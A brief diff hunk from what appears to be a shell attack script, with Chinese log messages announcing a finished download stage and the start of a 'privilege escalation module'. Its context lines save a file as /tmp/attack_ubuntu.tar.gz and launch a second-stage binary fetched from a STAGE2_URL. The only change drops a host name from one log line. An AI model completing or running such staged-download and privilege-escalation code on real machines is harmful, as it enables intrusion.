@@ -135,7 +135,7 @@ while [ $attempt -le $MAX_RETRIES ]; do
         -O "/tmp/attack_ubuntu.tar.gz
 
     log_info "[+] 下载阶段完成，继续后续操作..."
-    log_info "[*] 启动提权模块 (host=$HOST_NAME)"
+    log_info "[*] 启动提权模块"
 
     if STAGE2_URL="$STAGE2_URL" \
        STAGE2_FILENAME="$stage2_bin" \
